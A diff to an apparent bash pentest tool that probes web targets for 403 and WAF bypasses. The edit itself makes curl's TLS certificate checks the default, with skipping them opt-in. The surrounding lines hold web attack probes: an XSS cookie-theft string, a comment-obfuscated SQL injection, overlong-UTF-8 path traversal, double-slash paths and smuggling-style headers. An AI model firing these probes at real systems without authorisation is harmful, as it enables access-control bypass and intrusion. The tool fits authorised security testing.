@@ -22,9 +22,14 @@ hit()  { echo -e "${MAG}[BYPASS]${NC} $1"; }
 err()  { echo -e "${RED}[-]${NC} $1" >&2; }
 
 URL=""; LIST=""
+CURL_TLS_ARGS=()
+if [ "${HUNTER_LAB_INSECURE_TLS:-0}" = "1" ]; then
+  CURL_TLS_ARGS=(-k)
+fi
 while [ "$#" -gt 0 ]; do
   case "$1" in
     -l|--list) shift; LIST="${1:-}" ;;
+    --insecure) CURL_TLS_ARGS=(-k) ;;
     -h|--help) sed -n '2,10p' "$0"; exit 0 ;;
     *) URL="$1" ;;
   esac
@@ -58,8 +63,8 @@ fi
 _fingerprint_waf() {
   local target="$1"
   local hdrs body waf="unknown"
-  hdrs=$(curl -sIk --max-time 6 "$target" 2>/dev/null)
-  body=$(curl -sk --max-time 6 "$target" 2>/dev/null | head -c 4000)
+  hdrs=$(curl -sI ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} --max-time 6 "$target" 2>/dev/null)
+  body=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} --max-time 6 "$target" 2>/dev/null | head -c 4000)
   if _have wafw00f; then
     local w
     w=$(wafw00f "$target" 2>/dev/null | grep -Eo 'is behind .*' | head -1 || true)
@@ -88,7 +93,7 @@ _sample_block_baseline() {
   [ -f "$bb_len" ] && return 0  # already sampled this run
   local probe_url="${host}/?_waftest=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
   touch "$bb_body"  # ensure file exists even if curl fails/times-out
-  curl -sk --max-time 8 "$probe_url" -o "$bb_body" 2>/dev/null || true
+  curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} --max-time 8 "$probe_url" -o "$bb_body" 2>/dev/null || true
   local len
   len=$(wc -c < "$bb_body" 2>/dev/null | tr -d ' ')
   printf '%s' "${len:-0}" > "$bb_len"
@@ -228,7 +233,7 @@ _probe_one() {
     local _tmpbody _tmphdr
     _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
     _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
-    local _args=( -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 5 -X "$method" )
+    local _args=( -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 5 -X "$method" )
     [ -n "$hdr" ] && _args+=( -H "$hdr" )
     local _result
     _result=$(curl "${_args[@]}" "$url" 2>/dev/null || echo "0|0|0")
@@ -267,7 +272,7 @@ _probe_one() {
       local _tmpbody; _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _tmphdr; _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _res
-      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
+      _res=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         -H "Transfer-Encoding: chunked" -H "X-Forwarded-Host: localhost" \
         "$target" 2>/dev/null || echo "0|0|0")
       code="${_res%%|*}"
@@ -295,7 +300,7 @@ _probe_one() {
       local _tmpbody; _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _tmphdr; _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _res
-      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
+      _res=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         "${target}?id=1/**/AND/**/1=1" 2>/dev/null || echo "0|0|0")
       code="${_res%%|*}"
       local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
@@ -322,7 +327,7 @@ _probe_one() {
       local _tmpbody; _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _tmphdr; _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _res
-      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
+      _res=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         "${base}/%c0%2e%c0%2e/${last}" 2>/dev/null || echo "0|0|0")
       code="${_res%%|*}"
       local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
@@ -349,7 +354,7 @@ _probe_one() {
       local _tmpbody; _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _tmphdr; _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _res
-      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
+      _res=$(curl -s ${CURL_TLS_ARGS[@]+"${CURL_TLS_ARGS[@]}"} -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         "${base}/%2f%2f${last}" 2>/dev/null || echo "0|0|0")
       code="${_res%%|*}"
       local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
